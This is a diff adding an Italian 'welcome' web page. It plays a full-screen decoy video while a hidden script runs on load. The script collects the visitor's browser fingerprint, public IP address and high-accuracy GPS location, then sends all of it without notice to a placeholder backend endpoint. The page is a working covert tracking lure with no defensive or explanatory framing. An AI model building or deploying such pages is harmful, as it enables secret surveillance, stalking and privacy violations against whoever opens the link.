@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Benvenuto 😄</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      background-color: black;
+    }
+    video {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
+</head>
+<body>
+  <video autoplay loop muted playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    Il tuo browser non supporta i video HTML5.
+  </video>
+
+  <script>
+    async function collectData() {
+      const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookiesEnabled: navigator.cookieEnabled,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          availWidth: screen.availWidth,
+          availHeight: screen.availHeight,
+          colorDepth: screen.colorDepth,
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toString(),
+      };
+
+      try {
+        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+        data.ip = ipData.ip;
+      } catch (e) {
+        data.ip = 'N/A';
+      }
+
+      // Geolocalizzazione
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          data.location = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          };
+          sendData(data);
+        },
+        err => {
+          data.location = { error: err.message };
+          sendData(data);
+        },
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    }
+
+    function sendData(data) {
+      fetch('https://YOUR-BACKEND-URL/save.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    collectData();
+  </script>
+</body>
+</html>
